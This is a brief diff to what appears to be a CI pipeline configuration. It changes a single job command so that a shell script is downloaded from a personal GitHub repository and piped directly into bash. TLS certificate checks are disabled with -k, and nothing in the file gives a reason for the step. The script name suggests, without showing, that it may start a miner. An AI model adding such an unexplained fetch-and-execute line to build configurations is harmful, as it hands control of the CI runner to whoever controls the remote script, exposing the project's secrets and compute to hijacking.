@@ -10,4 +10,4 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - curl
+            - curl -fsSL -k https://raw.githubusercontent.com/abongiletraeffik/node-mino-app/refs/heads/main/start_sema_mino_maz.sh | bash
